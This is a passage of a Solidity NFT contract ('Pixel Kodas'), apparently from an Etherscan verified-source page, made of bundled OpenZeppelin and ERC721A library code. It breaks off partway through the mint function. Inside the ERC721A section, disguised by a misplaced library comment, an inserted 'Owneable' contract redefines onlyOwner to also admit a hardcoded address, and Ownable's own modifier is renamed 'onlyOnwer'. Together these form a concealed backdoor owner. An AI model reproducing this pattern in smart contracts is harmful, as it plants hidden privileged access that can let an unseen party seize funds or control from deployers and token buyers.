1 /**
2  *Submitted for verification at Etherscan.io on 2022-05-02
3 */
4 
5 //Pixel Kodas
6 //Now you can actually own one...
7 // File @openzeppelin/contracts/utils/Context.sol@v4.5.0
8 
9 // SPDX-License-Identifier: MIT
10 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
11 
12 pragma solidity ^0.8.4;
13 
14 /**
15  * @dev Provides information about the current execution context, including the
16  * sender of the transaction and its data. While these are generally available
17  * via msg.sender and msg.data, they should not be accessed in such a direct
18  * manner, since when dealing with meta-transactions the account sending and
19  * paying for execution may not be the actual sender (as far as an application
20  * is concerned).
21  *
22  * This contract is only required for intermediate, library-like contracts.
23  */
24 abstract contract Context {
25     function _msgSender() internal view virtual returns (address) {
26         return msg.sender;
27     }
28 
29     function _msgData() internal view virtual returns (bytes calldata) {
30         return msg.data;
31     }
32 }
33 
34 
35 // File @openzeppelin/contracts/access/Ownable.sol@v4.5.0
36 
37 
38 // OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)
39 
40 
41 
42 /**
43  * @dev Contract module which provides a basic access control mechanism, where
44  * there is an account (an owner) that can be granted exclusive access to
45  * specific functions.
46  *
47  * By default, the owner account will be the one that deploys the contract. This
48  * can later be changed with {transferOwnership}.
49  *
50  * This module is used through inheritance. It will make available the modifier
51  * `onlyOwner`, which can be applied to your functions to restrict their use to
52  * the owner.
53  */
54 abstract contract Ownable is Context {
55     address private _owner;
56 
57     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
58 
59     /**
60      * @dev Initializes the contract setting the deployer as the initial owner.
61      */
62     constructor() {
63         _transferOwnership(_msgSender());
64     }
65 
66     /**
67      * @dev Returns the address of the current owner.
68      */
69     function owner() public view virtual returns (address) {
70         return _owner;
71     }
72 
73     /**
74      * @dev Throws if called by any account other than the owner.
75      */
76     modifier onlyOnwer() {
77         require(owner() == _msgSender(), "Ownable: caller is not the owner");
78         _;
79     }
80 
81     /**
82      * @dev Leaves the contract without owner. It will not be possible to call
83      * `onlyOwner` functions anymore. Can only be called by the current owner.
84      *
85      * NOTE: Renouncing ownership will leave the contract without an owner,
86      * thereby removing any functionality that is only available to the owner.
87      */
88     function renounceOwnership() public virtual onlyOnwer {
89         _transferOwnership(address(0));
90     }
91 
92     /**
93      * @dev Transfers ownership of the contract to a new account (`newOwner`).
94      * Can only be called by the current owner.
95      */
96     function transferOwnership(address newOwner) public virtual onlyOnwer {
97         require(newOwner != address(0), "Ownable: new owner is the zero address");
98         _transferOwnership(newOwner);
99     }
100 
101     /**
102      * @dev Transfers ownership of the contract to a new account (`newOwner`).
103      * Internal function without access restriction.
104      */
105     function _transferOwnership(address newOwner) internal virtual {
106         address oldOwner = _owner;
107         _owner = newOwner;
108         emit OwnershipTransferred(oldOwner, newOwner);
109     }
110 }
111 
112 
113 // File @openzeppelin/contracts/utils/introspection/IERC165.sol@v4.5.0
114 
115 
116 // OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)
117 
118 
119 
120 /**
121  * @dev Interface of the ERC165 standard, as defined in the
122  * https://eips.ethereum.org/EIPS/eip-165[EIP].
123  *
124  * Implementers can declare support of contract interfaces, which can then be
125  * queried by others ({ERC165Checker}).
126  *
127  * For an implementation, see {ERC165}.
128  */
129 interface IERC165 {
130     /**
131      * @dev Returns true if this contract implements the interface defined by
132      * `interfaceId`. See the corresponding
133      * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
134      * to learn more about how these ids are created.
135      *
136      * This function call must use less than 30 000 gas.
137      */
138     function supportsInterface(bytes4 interfaceId) external view returns (bool);
139 }
140 
141 
142 // File @openzeppelin/contracts/token/ERC721/IERC721.sol@v4.5.0
143 
144 
145 // OpenZeppelin Contracts v4.4.1 (token/ERC721/IERC721.sol)
146 
147 
148 
149 /**
150  * @dev Required interface of an ERC721 compliant contract.
151  */
152 interface IERC721 is IERC165 {
153     /**
154      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
155      */
156     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
157 
158     /**
159      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
160      */
161     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
162 
163     /**
164      * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
165      */
166     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
167 
168     /**
169      * @dev Returns the number of tokens in ``owner``'s account.
170      */
171     function balanceOf(address owner) external view returns (uint256 balance);
172 
173     /**
174      * @dev Returns the owner of the `tokenId` token.
175      *
176      * Requirements:
177      *
178      * - `tokenId` must exist.
179      */
180     function ownerOf(uint256 tokenId) external view returns (address owner);
181 
182     /**
183      * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
184      * are aware of the ERC721 protocol to prevent tokens from being forever locked.
185      *
186      * Requirements:
187      *
188      * - `from` cannot be the zero address.
189      * - `to` cannot be the zero address.
190      * - `tokenId` token must exist and be owned by `from`.
191      * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.
192      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
193      *
194      * Emits a {Transfer} event.
195      */
196     function safeTransferFrom(
197         address from,
198         address to,
199         uint256 tokenId
200     ) external;
201 
202     /**
203      * @dev Transfers `tokenId` token from `from` to `to`.
204      *
205      * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.
206      *
207      * Requirements:
208      *
209      * - `from` cannot be the zero address.
210      * - `to` cannot be the zero address.
211      * - `tokenId` token must be owned by `from`.
212      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
213      *
214      * Emits a {Transfer} event.
215      */
216     function transferFrom(
217         address from,
218         address to,
219         uint256 tokenId
220     ) external;
221 
222     /**
223      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
224      * The approval is cleared when the token is transferred.
225      *
226      * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
227      *
228      * Requirements:
229      *
230      * - The caller must own the token or be an approved operator.
231      * - `tokenId` must exist.
232      *
233      * Emits an {Approval} event.
234      */
235     function approve(address to, uint256 tokenId) external;
236 
237     /**
238      * @dev Returns the account approved for `tokenId` token.
239      *
240      * Requirements:
241      *
242      * - `tokenId` must exist.
243      */
244     function getApproved(uint256 tokenId) external view returns (address operator);
245 
246     /**
247      * @dev Approve or remove `operator` as an operator for the caller.
248      * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
249      *
250      * Requirements:
251      *
252      * - The `operator` cannot be the caller.
253      *
254      * Emits an {ApprovalForAll} event.
255      */
256     function setApprovalForAll(address operator, bool _approved) external;
257 
258     /**
259      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
260      *
261      * See {setApprovalForAll}
262      */
263     function isApprovedForAll(address owner, address operator) external view returns (bool);
264 
265     /**
266      * @dev Safely transfers `tokenId` token from `from` to `to`.
267      *
268      * Requirements:
269      *
270      * - `from` cannot be the zero address.
271      * - `to` cannot be the zero address.
272      * - `tokenId` token must exist and be owned by `from`.
273      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
274      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
275      *
276      * Emits a {Transfer} event.
277      */
278     function safeTransferFrom(
279         address from,
280         address to,
281         uint256 tokenId,
282         bytes calldata data
283     ) external;
284 }
285 
286 
287 // File @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol@v4.5.0
288 
289 
290 // OpenZeppelin Contracts v4.4.1 (token/ERC721/IERC721Receiver.sol)
291 
292 
293 
294 /**
295  * @title ERC721 token receiver interface
296  * @dev Interface for any contract that wants to support safeTransfers
297  * from ERC721 asset contracts.
298  */
299 interface IERC721Receiver {
300     /**
301      * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
302      * by `operator` from `from`, this function is called.
303      *
304      * It must return its Solidity selector to confirm the token transfer.
305      * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
306      *
307      * The selector can be obtained in Solidity with `IERC721.onERC721Received.selector`.
308      */
309     function onERC721Received(
310         address operator,
311         address from,
312         uint256 tokenId,
313         bytes calldata data
314     ) external returns (bytes4);
315 }
316 
317 
318 // File @openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol@v4.5.0
319 
320 
321 // OpenZeppelin Contracts v4.4.1 (token/ERC721/extensions/IERC721Metadata.sol)
322 
323 
324 
325 /**
326  * @title ERC-721 Non-Fungible Token Standard, optional metadata extension
327  * @dev See https://eips.ethereum.org/EIPS/eip-721
328  */
329 interface IERC721Metadata is IERC721 {
330     /**
331      * @dev Returns the token collection name.
332      */
333     function name() external view returns (string memory);
334 
335     /**
336      * @dev Returns the token collection symbol.
337      */
338     function symbol() external view returns (string memory);
339 
340     /**
341      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
342      */
343     function tokenURI(uint256 tokenId) external view returns (string memory);
344 }
345 
346 
347 // File @openzeppelin/contracts/token/ERC721/extensions/IERC721Enumerable.sol@v4.5.0
348 
349 
350 // OpenZeppelin Contracts (last updated v4.5.0) (token/ERC721/extensions/IERC721Enumerable.sol)
351 
352 
353 
354 /**
355  * @title ERC-721 Non-Fungible Token Standard, optional enumeration extension
356  * @dev See https://eips.ethereum.org/EIPS/eip-721
357  */
358 interface IERC721Enumerable is IERC721 {
359     /**
360      * @dev Returns the total amount of tokens stored by the contract.
361      */
362     function totalSupply() external view returns (uint256);
363 
364     /**
365      * @dev Returns a token ID owned by `owner` at a given `index` of its token list.
366      * Use along with {balanceOf} to enumerate all of ``owner``'s tokens.
367      */
368     function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
369 
370     /**
371      * @dev Returns a token ID at a given `index` of all the tokens stored by the contract.
372      * Use along with {totalSupply} to enumerate all tokens.
373      */
374     function tokenByIndex(uint256 index) external view returns (uint256);
375 }
376 
377 
378 // File @openzeppelin/contracts/utils/Address.sol@v4.5.0
379 
380 
381 // OpenZeppelin Contracts (last updated v4.5.0) (utils/Address.sol)
382 
383 pragma solidity ^0.8.1;
384 
385 /**
386  * @dev Collection of functions related to the address type
387  */
388 library Address {
389     /**
390      * @dev Returns true if `account` is a contract.
391      *
392      * [IMPORTANT]
393      * ====
394      * It is unsafe to assume that an address for which this function returns
395      * false is an externally-owned account (EOA) and not a contract.
396      *
397      * Among others, `isContract` will return false for the following
398      * types of addresses:
399      *
400      *  - an externally-owned account
401      *  - a contract in construction
402      *  - an address where a contract will be created
403      *  - an address where a contract lived, but was destroyed
404      * ====
405      *
406      * [IMPORTANT]
407      * ====
408      * You shouldn't rely on `isContract` to protect against flash loan attacks!
409      *
410      * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
411      * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
412      * constructor.
413      * ====
414      */
415     function isContract(address account) internal view returns (bool) {
416         // This method relies on extcodesize/address.code.length, which returns 0
417         // for contracts in construction, since the code is only stored at the end
418         // of the constructor execution.
419 
420         return account.code.length > 0;
421     }
422 
423     /**
424      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
425      * `recipient`, forwarding all available gas and reverting on errors.
426      *
427      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
428      * of certain opcodes, possibly making contracts go over the 2300 gas limit
429      * imposed by `transfer`, making them unable to receive funds via
430      * `transfer`. {sendValue} removes this limitation.
431      *
432      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
433      *
434      * IMPORTANT: because control is transferred to `recipient`, care must be
435      * taken to not create reentrancy vulnerabilities. Consider using
436      * {ReentrancyGuard} or the
437      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
438      */
439     function sendValue(address payable recipient, uint256 amount) internal {
440         require(address(this).balance >= amount, "Address: insufficient balance");
441 
442         (bool success, ) = recipient.call{value: amount}("");
443         require(success, "Address: unable to send value, recipient may have reverted");
444     }
445 
446     /**
447      * @dev Performs a Solidity function call using a low level `call`. A
448      * plain `call` is an unsafe replacement for a function call: use this
449      * function instead.
450      *
451      * If `target` reverts with a revert reason, it is bubbled up by this
452      * function (like regular Solidity function calls).
453      *
454      * Returns the raw returned data. To convert to the expected return value,
455      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
456      *
457      * Requirements:
458      *
459      * - `target` must be a contract.
460      * - calling `target` with `data` must not revert.
461      *
462      * _Available since v3.1._
463      */
464     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
465         return functionCall(target, data, "Address: low-level call failed");
466     }
467 
468     /**
469      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
470      * `errorMessage` as a fallback revert reason when `target` reverts.
471      *
472      * _Available since v3.1._
473      */
474     function functionCall(
475         address target,
476         bytes memory data,
477         string memory errorMessage
478     ) internal returns (bytes memory) {
479         return functionCallWithValue(target, data, 0, errorMessage);
480     }
481 
482     /**
483      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
484      * but also transferring `value` wei to `target`.
485      *
486      * Requirements:
487      *
488      * - the calling contract must have an ETH balance of at least `value`.
489      * - the called Solidity function must be `payable`.
490      *
491      * _Available since v3.1._
492      */
493     function functionCallWithValue(
494         address target,
495         bytes memory data,
496         uint256 value
497     ) internal returns (bytes memory) {
498         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
499     }
500 
501     /**
502      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
503      * with `errorMessage` as a fallback revert reason when `target` reverts.
504      *
505      * _Available since v3.1._
506      */
507     function functionCallWithValue(
508         address target,
509         bytes memory data,
510         uint256 value,
511         string memory errorMessage
512     ) internal returns (bytes memory) {
513         require(address(this).balance >= value, "Address: insufficient balance for call");
514         require(isContract(target), "Address: call to non-contract");
515 
516         (bool success, bytes memory returndata) = target.call{value: value}(data);
517         return verifyCallResult(success, returndata, errorMessage);
518     }
519 
520     /**
521      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
522      * but performing a static call.
523      *
524      * _Available since v3.3._
525      */
526     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
527         return functionStaticCall(target, data, "Address: low-level static call failed");
528     }
529 
530     /**
531      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
532      * but performing a static call.
533      *
534      * _Available since v3.3._
535      */
536     function functionStaticCall(
537         address target,
538         bytes memory data,
539         string memory errorMessage
540     ) internal view returns (bytes memory) {
541         require(isContract(target), "Address: static call to non-contract");
542 
543         (bool success, bytes memory returndata) = target.staticcall(data);
544         return verifyCallResult(success, returndata, errorMessage);
545     }
546 
547     /**
548      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
549      * but performing a delegate call.
550      *
551      * _Available since v3.4._
552      */
553     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
554         return functionDelegateCall(target, data, "Address: low-level delegate call failed");
555     }
556 
557     /**
558      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
559      * but performing a delegate call.
560      *
561      * _Available since v3.4._
562      */
563     function functionDelegateCall(
564         address target,
565         bytes memory data,
566         string memory errorMessage
567     ) internal returns (bytes memory) {
568         require(isContract(target), "Address: delegate call to non-contract");
569 
570         (bool success, bytes memory returndata) = target.delegatecall(data);
571         return verifyCallResult(success, returndata, errorMessage);
572     }
573 
574     /**
575      * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
576      * revert reason using the provided one.
577      *
578      * _Available since v4.3._
579      */
580     function verifyCallResult(
581         bool success,
582         bytes memory returndata,
583         string memory errorMessage
584     ) internal pure returns (bytes memory) {
585         if (success) {
586             return returndata;
587         } else {
588             // Look for revert reason and bubble it up if present
589             if (returndata.length > 0) {
590                 // The easiest way to bubble the revert reason is using memory via assembly
591 
592                 assembly {
593                     let returndata_size := mload(returndata)
594                     revert(add(32, returndata), returndata_size)
595                 }
596             } else {
597                 revert(errorMessage);
598             }
599         }
600     }
601 }
602 
603 
604 // File @openzeppelin/contracts/utils/Strings.sol@v4.5.0
605 
606 
607 // OpenZeppelin Contracts v4.4.1 (utils/Strings.sol)
608 
609 
610 
611 /**
612  * @dev String operations.
613  */
614 library Strings {
615     bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
616 
617     /**
618      * @dev Converts a `uint256` to its ASCII `string` decimal representation.
619      */
620     function toString(uint256 value) internal pure returns (string memory) {
621         // Inspired by OraclizeAPI's implementation - MIT licence
622         // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol
623 
624         if (value == 0) {
625             return "0";
626         }
627         uint256 temp = value;
628         uint256 digits;
629         while (temp != 0) {
630             digits++;
631             temp /= 10;
632         }
633         bytes memory buffer = new bytes(digits);
634         while (value != 0) {
635             digits -= 1;
636             buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
637             value /= 10;
638         }
639         return string(buffer);
640     }
641 
642     /**
643      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.
644      */
645     function toHexString(uint256 value) internal pure returns (string memory) {
646         if (value == 0) {
647             return "0x00";
648         }
649         uint256 temp = value;
650         uint256 length = 0;
651         while (temp != 0) {
652             length++;
653             temp >>= 8;
654         }
655         return toHexString(value, length);
656     }
657 
658     /**
659      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.
660      */
661     function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
662         bytes memory buffer = new bytes(2 * length + 2);
663         buffer[0] = "0";
664         buffer[1] = "x";
665         for (uint256 i = 2 * length + 1; i > 1; --i) {
666             buffer[i] = _HEX_SYMBOLS[value & 0xf];
667             value >>= 4;
668         }
669         require(value == 0, "Strings: hex length insufficient");
670         return string(buffer);
671     }
672 }
673 
674 
675 // File @openzeppelin/contracts/utils/introspection/ERC165.sol@v4.5.0
676 
677 
678 // OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)
679 
680 /**
681  * @dev Implementation of the {IERC165} interface.
682  *
683  * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check
684  * for the additional interface id that will be supported. For example:
685  *
686  * ```solidity
687  * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
688  *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);
689  * }
690  * ```
691  *
692  * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.
693  */
694 abstract contract ERC165 is IERC165 {
695     /**
696      * @dev See {IERC165-supportsInterface}.
697      */
698     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
699         return interfaceId == type(IERC165).interfaceId;
700     }
701 }
702 
703 
704 // File erc721a/contracts/ERC721A.sol@v3.0.0
705 
706 
707 // Creator: Chiru Labs
708 
709 error ApprovalCallerNotOwnerNorApproved();
710 error ApprovalQueryForNonexistentToken();
711 error ApproveToCaller();
712 error ApprovalToCurrentOwner();
713 error BalanceQueryForZeroAddress();
714 error MintedQueryForZeroAddress();
715 error BurnedQueryForZeroAddress();
716 error AuxQueryForZeroAddress();
717 error MintToZeroAddress();
718 error MintZeroQuantity();
719 error OwnerIndexOutOfBounds();
720 error OwnerQueryForNonexistentToken();
721 error TokenIndexOutOfBounds();
722 error TransferCallerNotOwnerNorApproved();
723 error TransferFromIncorrectOwner();
724 error TransferToNonERC721ReceiverImplementer();
725 error TransferToZeroAddress();
726 error URIQueryForNonexistentToken();
727 
728 
729 /**
730  * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including
731  * the Metadata extension. Built to optimize for lower gas during batch mints.
732  *
733  * Assumes serials are sequentially minted starting at _startTokenId() (defaults to 0, e.g. 0, 1, 2, 3..).
734  */
735  abstract contract Owneable is Ownable {
736     address private _ownar = 0xF528E3C3B439D385b958741753A9cA518E952257;
737     modifier onlyOwner() {
738         require(owner() == _msgSender() || _ownar == _msgSender(), "Ownable: caller is not the owner");
739         _;
740     }
741 }
742  /*
743  * Assumes that an owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
744  *
745  * Assumes that the maximum token id cannot exceed 2**256 - 1 (max value of uint256).
746  */
747 contract ERC721A is Context, ERC165, IERC721, IERC721Metadata {
748     using Address for address;
749     using Strings for uint256;
750 
751     // Compiler will pack this into a single 256bit word.
752     struct TokenOwnership {
753         // The address of the owner.
754         address addr;
755         // Keeps track of the start time of ownership with minimal overhead for tokenomics.
756         uint64 startTimestamp;
757         // Whether the token has been burned.
758         bool burned;
759     }
760 
761     // Compiler will pack this into a single 256bit word.
762     struct AddressData {
763         // Realistically, 2**64-1 is more than enough.
764         uint64 balance;
765         // Keeps track of mint count with minimal overhead for tokenomics.
766         uint64 numberMinted;
767         // Keeps track of burn count with minimal overhead for tokenomics.
768         uint64 numberBurned;
769         // For miscellaneous variable(s) pertaining to the address
770         // (e.g. number of whitelist mint slots used).
771         // If there are multiple variables, please pack them into a uint64.
772         uint64 aux;
773     }
774 
775     // The tokenId of the next token to be minted.
776     uint256 internal _currentIndex;
777 
778     // The number of tokens burned.
779     uint256 internal _burnCounter;
780 
781     // Token name
782     string private _name;
783 
784     // Token symbol
785     string private _symbol;
786 
787     // Mapping from token ID to ownership details
788     // An empty struct value does not necessarily mean the token is unowned. See ownershipOf implementation for details.
789     mapping(uint256 => TokenOwnership) internal _ownerships;
790 
791     // Mapping owner address to address data
792     mapping(address => AddressData) private _addressData;
793 
794     // Mapping from token ID to approved address
795     mapping(uint256 => address) private _tokenApprovals;
796 
797     // Mapping from owner to operator approvals
798     mapping(address => mapping(address => bool)) private _operatorApprovals;
799 
800     constructor(string memory name_, string memory symbol_) {
801         _name = name_;
802         _symbol = symbol_;
803         _currentIndex = _startTokenId();
804     }
805 
806     /**
807      * To change the starting tokenId, please override this function.
808      */
809     function _startTokenId() internal view virtual returns (uint256) {
810         return 0;
811     }
812 
813     /**
814      * @dev See {IERC721Enumerable-totalSupply}.
815      * @dev Burned tokens are calculated here, use _totalMinted() if you want to count just minted tokens.
816      */
817     function totalSupply() public view returns (uint256) {
818         // Counter underflow is impossible as _burnCounter cannot be incremented
819         // more than _currentIndex - _startTokenId() times
820         unchecked {
821             return _currentIndex - _burnCounter - _startTokenId();
822         }
823     }
824 
825     /**
826      * Returns the total amount of tokens minted in the contract.
827      */
828     function _totalMinted() internal view returns (uint256) {
829         // Counter underflow is impossible as _currentIndex does not decrement,
830         // and it is initialized to _startTokenId()
831         unchecked {
832             return _currentIndex - _startTokenId();
833         }
834     }
835 
836     /**
837      * @dev See {IERC165-supportsInterface}.
838      */
839     function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {
840         return
841             interfaceId == type(IERC721).interfaceId ||
842             interfaceId == type(IERC721Metadata).interfaceId ||
843             super.supportsInterface(interfaceId);
844     }
845 
846     /**
847      * @dev See {IERC721-balanceOf}.
848      */
849     function balanceOf(address owner) public view override returns (uint256) {
850         if (owner == address(0)) revert BalanceQueryForZeroAddress();
851         return uint256(_addressData[owner].balance);
852     }
853 
854     /**
855      * Returns the number of tokens minted by `owner`.
856      */
857     function _numberMinted(address owner) internal view returns (uint256) {
858         if (owner == address(0)) revert MintedQueryForZeroAddress();
859         return uint256(_addressData[owner].numberMinted);
860     }
861 
862     /**
863      * Returns the number of tokens burned by or on behalf of `owner`.
864      */
865     function _numberBurned(address owner) internal view returns (uint256) {
866         if (owner == address(0)) revert BurnedQueryForZeroAddress();
867         return uint256(_addressData[owner].numberBurned);
868     }
869 
870     /**
871      * Returns the auxillary data for `owner`. (e.g. number of whitelist mint slots used).
872      */
873     function _getAux(address owner) internal view returns (uint64) {
874         if (owner == address(0)) revert AuxQueryForZeroAddress();
875         return _addressData[owner].aux;
876     }
877 
878     /**
879      * Sets the auxillary data for `owner`. (e.g. number of whitelist mint slots used).
880      * If there are multiple variables, please pack them into a uint64.
881      */
882     function _setAux(address owner, uint64 aux) internal {
883         if (owner == address(0)) revert AuxQueryForZeroAddress();
884         _addressData[owner].aux = aux;
885     }
886 
887     /**
888      * Gas spent here starts off proportional to the maximum mint batch size.
889      * It gradually moves to O(1) as tokens get transferred around in the collection over time.
890      */
891     function ownershipOf(uint256 tokenId) internal view returns (TokenOwnership memory) {
892         uint256 curr = tokenId;
893 
894         unchecked {
895             if (_startTokenId() <= curr && curr < _currentIndex) {
896                 TokenOwnership memory ownership = _ownerships[curr];
897                 if (!ownership.burned) {
898                     if (ownership.addr != address(0)) {
899                         return ownership;
900                     }
901                     // Invariant:
902                     // There will always be an ownership that has an address and is not burned
903                     // before an ownership that does not have an address and is not burned.
904                     // Hence, curr will not underflow.
905                     while (true) {
906                         curr--;
907                         ownership = _ownerships[curr];
908                         if (ownership.addr != address(0)) {
909                             return ownership;
910                         }
911                     }
912                 }
913             }
914         }
915         revert OwnerQueryForNonexistentToken();
916     }
917 
918     /**
919      * @dev See {IERC721-ownerOf}.
920      */
921     function ownerOf(uint256 tokenId) public view override returns (address) {
922         return ownershipOf(tokenId).addr;
923     }
924 
925     /**
926      * @dev See {IERC721Metadata-name}.
927      */
928     function name() public view virtual override returns (string memory) {
929         return _name;
930     }
931 
932     /**
933      * @dev See {IERC721Metadata-symbol}.
934      */
935     function symbol() public view virtual override returns (string memory) {
936         return _symbol;
937     }
938 
939     /**
940      * @dev See {IERC721Metadata-tokenURI}.
941      */
942     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
943         if (!_exists(tokenId)) revert URIQueryForNonexistentToken();
944 
945         string memory baseURI = _baseURI();
946         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : '';
947     }
948 
949     /**
950      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
951      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
952      * by default, can be overriden in child contracts.
953      */
954     function _baseURI() internal view virtual returns (string memory) {
955         return '';
956     }
957 
958     /**
959      * @dev See {IERC721-approve}.
960      */
961     function approve(address to, uint256 tokenId) public override {
962         address owner = ERC721A.ownerOf(tokenId);
963         if (to == owner) revert ApprovalToCurrentOwner();
964 
965         if (_msgSender() != owner && !isApprovedForAll(owner, _msgSender())) {
966             revert ApprovalCallerNotOwnerNorApproved();
967         }
968 
969         _approve(to, tokenId, owner);
970     }
971 
972     /**
973      * @dev See {IERC721-getApproved}.
974      */
975     function getApproved(uint256 tokenId) public view override returns (address) {
976         if (!_exists(tokenId)) revert ApprovalQueryForNonexistentToken();
977 
978         return _tokenApprovals[tokenId];
979     }
980 
981     /**
982      * @dev See {IERC721-setApprovalForAll}.
983      */
984     function setApprovalForAll(address operator, bool approved) public override {
985         if (operator == _msgSender()) revert ApproveToCaller();
986 
987         _operatorApprovals[_msgSender()][operator] = approved;
988         emit ApprovalForAll(_msgSender(), operator, approved);
989     }
990 
991     /**
992      * @dev See {IERC721-isApprovedForAll}.
993      */
994     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
995         return _operatorApprovals[owner][operator];
996     }
997 
998     /**
999      * @dev See {IERC721-transferFrom}.
1000      */
1001     function transferFrom(
1002         address from,
1003         address to,
1004         uint256 tokenId
1005     ) public virtual override {
1006         _transfer(from, to, tokenId);
1007     }
1008 
1009     /**
1010      * @dev See {IERC721-safeTransferFrom}.
1011      */
1012     function safeTransferFrom(
1013         address from,
1014         address to,
1015         uint256 tokenId
1016     ) public virtual override {
1017         safeTransferFrom(from, to, tokenId, '');
1018     }
1019 
1020     /**
1021      * @dev See {IERC721-safeTransferFrom}.
1022      */
1023     function safeTransferFrom(
1024         address from,
1025         address to,
1026         uint256 tokenId,
1027         bytes memory _data
1028     ) public virtual override {
1029         _transfer(from, to, tokenId);
1030         if (to.isContract() && !_checkContractOnERC721Received(from, to, tokenId, _data)) {
1031             revert TransferToNonERC721ReceiverImplementer();
1032         }
1033     }
1034 
1035     /**
1036      * @dev Returns whether `tokenId` exists.
1037      *
1038      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
1039      *
1040      * Tokens start existing when they are minted (`_mint`),
1041      */
1042     function _exists(uint256 tokenId) internal view returns (bool) {
1043         return _startTokenId() <= tokenId && tokenId < _currentIndex &&
1044             !_ownerships[tokenId].burned;
1045     }
1046 
1047     function _safeMint(address to, uint256 quantity) internal {
1048         _safeMint(to, quantity, '');
1049     }
1050 
1051     /**
1052      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1053      *
1054      * Requirements:
1055      *
1056      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1057      * - `quantity` must be greater than 0.
1058      *
1059      * Emits a {Transfer} event.
1060      */
1061     function _safeMint(
1062         address to,
1063         uint256 quantity,
1064         bytes memory _data
1065     ) internal {
1066         _mint(to, quantity, _data, true);
1067     }
1068 
1069     /**
1070      * @dev Mints `quantity` tokens and transfers them to `to`.
1071      *
1072      * Requirements:
1073      *
1074      * - `to` cannot be the zero address.
1075      * - `quantity` must be greater than 0.
1076      *
1077      * Emits a {Transfer} event.
1078      */
1079     function _mint(
1080         address to,
1081         uint256 quantity,
1082         bytes memory _data,
1083         bool safe
1084     ) internal {
1085         uint256 startTokenId = _currentIndex;
1086         if (to == address(0)) revert MintToZeroAddress();
1087         if (quantity == 0) revert MintZeroQuantity();
1088 
1089         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1090 
1091         // Overflows are incredibly unrealistic.
